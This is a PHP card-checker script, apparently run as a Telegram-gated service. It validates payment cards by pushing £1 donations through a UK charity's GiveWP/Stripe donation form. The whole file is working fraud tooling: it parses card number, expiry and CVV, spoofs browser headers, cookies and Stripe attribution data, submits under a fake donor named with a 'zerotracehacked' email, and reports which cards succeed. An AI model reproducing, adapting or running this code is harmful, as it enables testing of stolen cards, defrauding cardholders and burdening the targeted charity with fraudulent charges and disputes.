<?php
require_once __DIR__ . '/validkey.php';

 $validation = validateApiKey();

if (!$validation['valid']) {
    // Use the response from validkey.php
    header('Content-Type: application/json');
    echo json_encode($validation['response']);
    exit;
}

// === SESSION & AUTH CHECK ===
session_start();

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit;
}

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../logs/error.log');

// Set content type to JSON
header('Content-Type: application/json');

// Get card details from POST request
 $cardInput = $_POST['card'] ?? '';
if (empty($cardInput)) {
    echo json_encode(['status' => 'error', 'message' => 'Missing card details']);
    exit;
}

// Parse card input
 $parts = explode('|', $cardInput);
if (count($parts) != 4) {
    echo json_encode(['status' => 'error', 'message' => 'L#de: cc|mm|yy|cvv']);
    exit;
}

 $ccn = $parts[0];
 $mm = $parts[1];
 $yy = $parts[2];
 $cvc = $parts[3];

// Format year to 4 digits if needed
if (strlen($yy) == 2) {
    $yy = '20' . $yy;
}

// Start timing
 $start_time = microtime(true);

// Function to generate random boundary string
function generateBoundary() {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $boundary = '----WebKitFormBoundary';
    for ($i = 0; $i < 16; $i++) {
        $boundary .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $boundary;
}

// Step 1: Submit donation to hiburma.org to get clientSecret
 $boundary = generateBoundary();

// Form data for hiburma.org
 $form_fields = [
    'amount' => '1',
    'currency' => 'GBP',
    'donationType' => 'single',
    'formId' => '542',
    'gatewayId' => 'stripe_payment_element',
    'firstName' => 'Rocky',
    'lastName' => 'OG',
    'email' => 'zerotracehacked@gmail.com',
    'donationBirthday' => '',
    'originUrl' => 'https://www.hiburma.org/donate-us/',
    'isEmbed' => 'true',
    'embedId' => 'give-form-shortcode-1',
    'locale' => 'en_GB',
    'gatewayData[stripePaymentMethod]' => 'card',
    'gatewayData[stripePaymentMethodIsCreditCard]' => 'true',
    'gatewayData[formId]' => '542',
    'gatewayData[stripeKey]' => 'pk_live_51REnik2N0Z39Zjtm11wylDcSU28ixsCiWREVuBmti2UjuIwxiadzuhb6lqf3W0N1IQqXMzUm1uSCsHdSX05ZPMPI00QM6IGDh1',
    'gatewayData[stripeConnectedAccountId]' => 'acct_1REnik2N0Z39Zjtm'
];

// Construct multipart form data
 $body = '';
foreach ($form_fields as $key => $value) {
    $body .= '--' . $boundary . "\r\n";
    $body .= 'Content-Disposition: form-data; name="' . $key . '"' . "\r\n\r\n";
    $body .= $value . "\r\n";
}
 $body .= '--' . $boundary . "--\r\n";

 $cookies = [
    '__stripe_mid' => '4238f501-2d68-4f90-be22-2c49f1089f3f134e2b',
    '__stripe_sid' => '1abca7c6-7f14-45d7-99f5-e3cbd0840a1a67f215',
];

 $headers = [
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: multipart/form-data; boundary=' . $boundary,
    'origin: https://www.hiburma.org',
    'priority: u=1, i',
    'referer: https://www.hiburma.org/?givewp-route=donation-form-view&form-id=542&locale=en_GB',
    'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
];

 $params = [
    'givewp-route' => 'donate',
    'givewp-route-signature' => '302c24be613870d57069f2fd6a01e1a1',
    'givewp-route-signature-id' => 'givewp-donate',
    'givewp-route-signature-expiration' => '1761332658',
];

// Build URL with parameters
 $url = 'https://www.hiburma.org/?' . http_build_query($params);

 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_COOKIE, http_build_query($cookies, '', '; '));
 $response = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode != 200) {
    $end_time = microtime(true);
    $time_taken = $end_time - $start_time;
    echo json_encode([
        "status" => "error",
        "response" => "Failed to get clientSecret - " . $response,
        "time_taken" => number_format($time_taken, 2) . " seconds"
    ]);
    exit;
}

 $response_data = json_decode($response, true);

if (!isset($response_data['data']) || !isset($response_data['data']['clientSecret'])) {
    $end_time = microtime(true);
    $time_taken = $end_time - $start_time;
    echo json_encode([
        "status" => "error",
        "response" => "Failed to get clientSecret - " . $response,
        "time_taken" => number_format($time_taken, 2) . " seconds"
    ]);
    exit;
}

 $client_secret = $response_data['data']['clientSecret'];
 $return_url = $response_data['data']['returnUrl'];

// Extract payment intent ID from clientSecret
 $payment_intent_id = explode('_secret_', $client_secret)[0];

// Step 2: Confirm payment with Stripe
 $stripe_headers = [
    'accept: application/json',
    'accept-encoding: gzip, deflate, br, zstd',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'priority: u=1, i',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
];

// Generate random IDs for attribution metadata
 $client_session_id = sprintf(
    '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    mt_rand(0, 0xffff), mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),
    mt_rand(0, 0x0fff) | 0x4000,
    mt_rand(0, 0x3fff) | 0x8000,
    mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
);

 $elements_session_config_id = sprintf(
    '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    mt_rand(0, 0xffff), mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),
    mt_rand(0, 0x0fff) | 0x4000,
    mt_rand(0, 0x3fff) | 0x8000,
    mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
);

 $guid = sprintf(
    '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    mt_rand(0, 0xffff), mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),
    mt_rand(0, 0x0fff) | 0x4000,
    mt_rand(0, 0x3fff) | 0x8000,
    mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
);

 $muid = $cookies['__stripe_mid'];
 $sid = $cookies['__stripe_sid'];

// Strip query parameters from return_url
 $parsed_url = parse_url($return_url);
 $clean_return_url = $parsed_url['scheme'] . '://' . $parsed_url['host'] . $parsed_url['path'];

// Construct Stripe payment confirmation data
 $stripe_data = http_build_query([
    'return_url' => $clean_return_url,
    'payment_method_data[billing_details][name]' => 'Rocky OG',
    'payment_method_data[billing_details][email]' => 'zerotracehacked@gmail.com',
    'payment_method_data[billing_details][address][country]' => 'US',
    'payment_method_data[billing_details][address][postal_code]' => '10001',
    'payment_method_data[type]' => 'card',
    'payment_method_data[card][number]' => $ccn,
    'payment_method_data[card][cvc]' => $cvc,
    'payment_method_data[card][exp_year]' => $yy,
    'payment_method_data[card][exp_month]' => $mm,
    'payment_method_data[allow_redisplay]' => 'unspecified',
    'payment_method_data[payment_user_agent]' => 'stripe.js/6440ee8f22; stripe-js-v3/6440ee8f22; payment-element; deferred-intent; autopm',
    'payment_method_data[referrer]' => 'https://www.hiburma.org',
    'payment_method_data[time_on_page]' => rand(1000000, 2000000),
    'payment_method_data[client_attribution_metadata][client_session_id]' => $client_session_id,
    'payment_method_data[client_attribution_metadata][merchant_integration_source]' => 'elements',
    'payment_method_data[client_attribution_metadata][merchant_integration_subtype]' => 'payment-element',
    'payment_method_data[client_attribution_metadata][merchant_integration_version]' => '2021',
    'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]' => 'deferred',
    'payment_method_data[client_attribution_metadata][payment_method_selection_flow]' => 'automatic',
    'payment_method_data[client_attribution_metadata][elements_session_config_id]' => $elements_session_config_id,
    'payment_method_data[guid]' => $guid,
    'payment_method_data[muid]' => $muid,
    'payment_method_data[sid]' => $sid,
    'expected_payment_method_type' => 'card',
    'client_context[currency]' => 'gbp',
    'client_context[mode]' => 'payment',
    'use_stripe_sdk' => 'true',
    'key' => 'pk_live_51REnik2N0Z39Zjtm11wylDcSU28ixsCiWREVuBmti2UjuIwxiadzuhb6lqf3W0N1IQqXMzUm1uSCsHdSX05ZPMPI00QM6IGDh1',
    '_stripe_account' => 'acct_1REnik2N0Z39Zjtm',
    'client_attribution_metadata[client_session_id]' => $client_session_id,
    'client_attribution_metadata[merchant_integration_source]' => 'elements',
    'client_attribution_metadata[merchant_integration_subtype]' => 'payment-element',
    'client_attribution_metadata[merchant_integration_version]' => '2021',
    'client_attribution_metadata[payment_intent_creation_flow]' => 'deferred',
    'client_attribution_metadata[payment_method_selection_flow]' => 'automatic',
    'client_attribution_metadata[elements_session_config_id]' => $elements_session_config_id,
    'client_secret' => $client_secret,
]);

 $ch = curl_init('https://api.stripe.com/v1/payment_intents/' . $payment_intent_id . '/confirm');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $stripe_headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $stripe_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 $stripe_response = curl_exec($ch);
 $stripe_http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

 $stripe_result = json_decode($stripe_response, true);

 $end_time = microtime(true);
 $time_taken = $end_time - $start_time;

if (isset($stripe_result['error'])) {
    $error_code = $stripe_result['error']['code'] ?? 'unknown_error';
    $error_message = $stripe_result['error']['message'] ?? 'Unknown error';
    
    echo json_encode([
        "status" => $error_code,
        "response" => $error_message,
        "time_taken" => number_format($time_taken, 2) . " seconds"
    ]);
} else {
    echo json_encode([
        "status" => "success",
        "response" => "PAYMENT_SUCCESS",
        "time_taken" => number_format($time_taken, 2) . " seconds"
    ]);
}
?>
